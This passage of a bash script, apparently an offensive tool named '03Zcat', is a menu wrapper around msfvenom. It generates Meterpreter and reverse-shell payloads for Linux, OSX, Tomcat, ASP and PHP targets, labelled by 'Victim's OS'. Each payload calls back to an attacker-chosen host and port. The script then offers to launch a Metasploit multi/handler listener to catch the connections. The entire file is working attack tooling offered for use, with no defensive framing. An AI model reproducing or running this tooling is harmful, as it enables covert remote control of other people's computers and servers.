    echo -e "☣ ${White}2⃣ ${Purple}linux/x86/meterpreter_reverse_https       ${Blue}        ☣"
    echo -e "☣ ${White}3⃣ ${Purple}linux/x86/meterpreter_reverse_http       ${Blue}         ☣"
    echo -e "☣ ${White}4⃣ ${Purple}linux/x86/meterpreter/reverse_tcp_uuid   ${Blue}         ☣"
    echo -e "☣ ${White}5⃣ ${Purple}linux/x86/meterpreter/reverse_ipv6_tcp   ${Blue}         ☣"
    echo -e "☣ ${White}6⃣ ${Purple}linux/x86/meterpreter/reverse_nonx_tcp   ${Blue}         ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadlinux
  
    case  $payloadlinux  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
        payload='linux/x86/meterpreter_reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
        payload='linux/x86/meterpreter_reverse_https' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
        payload='linux/x86/meterpreter_reverse_http' ;;

        4)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
        
        5)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
        
        6)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f elf > ~/Desktop/payloads/$file.elf 2>/dev/null
        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;

    
        * )
	echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
        sleep 1
        exit ;;

    esac
}

Linuxpy (){
    clear
    logo
    echo -e "\n"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "+\t${Green}             ☣️☣️  .PY Payloads for Linux  ☣️☣️              +"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}linux/x86/meterpreter_reverse_tcp         ${Blue}        ☣"
    echo -e "☣ ${White}2⃣ ${Purple}linux/x86/meterpreter_reverse_https       ${Blue}        ☣"
    echo -e "☣ ${White}3⃣ ${Purple}linux/x86/meterpreter_reverse_http       ${Blue}         ☣"
    echo -e "☣ ${White}4⃣ ${Purple}linux/x86/meterpreter/reverse_tcp_uuid   ${Blue}         ☣"
    echo -e "☣ ${White}5⃣ ${Purple}linux/x86/meterpreter/reverse_ipv6_tcp   ${Blue}         ☣"
    echo -e "☣ ${White}6⃣ ${Purple}linux/x86/meterpreter/reverse_nonx_tcp   ${Blue}         ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadlinux
  
    case  $payloadlinux  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
        payload='linux/x86/meterpreter_reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
        payload='linux/x86/meterpreter_reverse_https' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
        payload='linux/x86/meterpreter_reverse_http' ;;

        4)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
        payload='linux/x86/meterpreter/reverse_tcp_uuid' ;;
        
        5)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
        payload='linux/x86/meterpreter/reverse_ipv6_tcp' ;;
        
        6)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p linux/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f py > ~/Desktop/payloads/$file.py 2>/dev/null
        payload='linux/x86/meterpreter/reverse_nonx_tcp' ;;

    
        * )
	echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
        sleep 1
        exit ;;

    esac
}

osx (){
    clear
    logo
    echo -e "\n"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    echo -e "\t${Green}              ☣️☣️   Payloads for OSX ☣️☣️               "
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Blue}☣ "
    echo -e "${White}1⃣ ${Purple}osx/x86/meterpreter_reverse_tcp         ${Blue}          ☣"
    echo -e "☣ ${White}2⃣ ${Purple}osx/x86/meterpreter_reverse_https       ${Blue}          ☣"
    echo -e "☣ ${White}3⃣ ${Purple}osx/x86/meterpreter_reverse_http       ${Blue}           ☣"
    echo -e "☣ ${White}4⃣ ${Purple}osx/x86/meterpreter/reverse_tcp_uuid   ${Blue}           ☣"
    echo -e "☣ ${White}5⃣ ${Purple}osx/x86/meterpreter/reverse_ipv6_tcp   ${Blue}           ☣"
    echo -e "☣ ${White}6⃣ ${Purple}osx/x86/meterpreter/reverse_nonx_tcp   ${Blue}           ☣"
    echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
    sleep 0.3
    echo -ne "${Green}[☣️03Zcat] Payload>> ${White}" 
    read payloadosx
  
    case  $payloadosx  in

        1)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p osx/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
        payload='osx/x86/meterpreter_reverse_tcp' ;;

        2)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p osx/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
        payload='osx/x86/meterpreter_reverse_https' ;;

        3)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p osx/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
        payload='osx/x86/meterpreter_reverse_http' ;;

        4)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p osx/x86/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
        payload='osx/x86/meterpreter/reverse_tcp_uuid' ;;
        
        5)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p osx/x86/meterpreter/reverse_ipv6_tcp LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
        payload='osx/x86/meterpreter/reverse_ipv6_tcp' ;;
        
        6)
        target
        echo
        echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
        echo
        msfvenom -p osx/x86/meterpreter/reverse_nonx_tcp LHOST=$ip LPORT=$port -f macho > ~/Desktop/payloads/$file.macho 2>/dev/null
        payload='osx/x86/meterpreter/reverse_nonx_tcp' ;;

    
        * )
	echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
        sleep 1
        exit ;;

    esac
}

others () {
    clear
    logo 
sleep 0.3
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
echo -e "\t${Green}              ☣️☣️    EXECUTE OTHERS ☣️☣️            "
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Blue}☣ "
echo -e "${White}          1⃣ ${Purple}tomcat       ${Blue}                              ☣"
echo -e "☣ ${White}          2⃣ ${Purple}ASP      ${Blue}                                ☣"
echo -e "☣ ${White}          3⃣ ${Purple}PHP       ${Blue}                               ☣"
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Green}[☣️03Zcat]>>${White} " 
read others


case  $others in

    1)
    target
    echo
    echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
    echo
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > ~/Desktop/payloads/$file.war 2>/dev/null
    payload='java/jsp_shell_reverse_tcp' ;;

    2)
    target
    echo
    echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
    echo
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > ~/Desktop/payloads/$file.asp 2>/dev/null
    payload='windows/meterpreter/reverse_tcp' ;;

    3)
    target
    echo
    echo -ne "\033[1;32m[☣️03Zcat] Payload generated"; sleep 0.3;echo -ne "☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne "   ☣️";sleep 0.3;echo -ne ".\n"
    echo
    msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f php > ~/Desktop/payloads/$file.php 2>/dev/null
    payload='php/meterpreter_reverse_tcp' ;;

    * )
    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
    sleep 1
    echo -e "${Cyan}[☣️03Zcat] Exiting..."
    sleep 0.2 
    exit ;;
    
    esac
}


if [ $root  != 0 ] ; then
    echo -e "${Purple}[☣️03Zcat] run as root 'sudo 03Zcat.sh'! "
    sleep 2
    exit
fi

if [ -e  $folder ] ; then
    cd ~/Desktop/payloads
else
    mkdir ~/Desktop/payloads &&  cd ~/Desktop/payloads
fi


clear
logo
sleep 0.3
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
echo -e "\t${Green}              ☣️☣️    Victim's OS  ☣️☣️            "
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Blue}☣ "
echo -e "${White}          1⃣ ${Purple}WINDOWS         ${Blue}                              ☣"
echo -e "☣ ${White}          2⃣ ${Purple}ANDROID       ${Blue}                                ☣"
echo -e "☣ ${White}          3⃣ ${Purple}LINUX       ${Blue}                                  ☣"
echo -e "☣ ${White}          4⃣ ${Purple}OSX   ${Blue}                                       ☣"
echo -e "☣ ${White}          5⃣ ${Purple}OTHERS   ${Blue}                                      ☣"
echo -e "\033[1;36m☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ ☣️ "
sleep 0.3
echo -ne "${Green}[☣️03Zcat]>>${White} " 
read OS

case  $OS  in

    1)
    windows;;

    2)
    android ;;

    3)
    linux ;;
    
    4)
    osx ;;

    5)
    others ;;

    * )
    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
    sleep 1
    echo -e "${Cyan}[☣️03Zcat] Exiting..."
    sleep 0.2 
    exit ;;

esac

echo -e "${Purple}[☣️03Zcat] Payload has been saved in the folder ~/root/Desktop/payloads/"
sleep 0.3
echo -ne "${Green}[☣️03Zcat] Do you want automatic execution handler and let it listen? [${Cyan}y${Green}/${Cyan}n${Green}]: ${White}" 
read p
if [ $p  =  "y" ] 
then
    clear
    echo -e "${Green}[☣️03Zcat] OPENING MSFCONSOLE${Green}... "
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit -j "
elif [ $p  =  "n" ] 
then
    echo -e "${Cyan}[☣️03Zcat]           ☠☠ HAPPYE HACKING ☠☠
    
    
    
                   
                    ▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
                    ▐▓█  ▀  ▀▄  █▓▌░█▄▄▄█░
                    ▐▓█  ▄  ▄▀  █▓▌░█▄▄▄█░
                    ▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
                    ░░░░▄▄███▄▄░░░░░█████░"  
    sleep 0.2 
    exit
else
    echo -e "${Cyan}[☣️03Zcat] ☣️☣️ ERROR ☣️☣️!"  
    sleep 1
    echo -e "${Cyan}[☣️03Zcat] Exiting..."
    sleep 0.2 
    exit
fi


